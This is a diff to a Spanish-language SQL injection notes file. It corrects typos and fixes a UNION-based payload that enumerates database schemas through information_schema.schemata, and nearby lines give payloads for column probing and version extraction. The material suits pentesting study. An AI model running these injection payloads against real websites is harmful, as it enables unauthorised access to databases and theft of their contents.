@@ -18,8 +18,8 @@ Una vez ya hemos identificado las columnas debemos probar con un
 `' union select 'a','b'-- -` | `' union select 1,2-- -` | `' union select NULL,NULL-- -`, nos devuelve los valores introducidos en el union select en la pagina por lo cual identificamos que es una base de datos MySQL o MSSQL
 
 Para extraer la versión
-`' union select 1,@@version-- -`, nos devolvera toda la informacion de la base de datos
+`' union select 1,@@version-- -`, nos devolverá toda la información de la base de datos
 
-Para enumerar las bases de datos exisitentes
-`' union select 1,schema_name from information_schema-- -`
+Para enumerar las bases de datos existentes
+`' union select 1,schema_name from information_schema.schemata-- -`
 
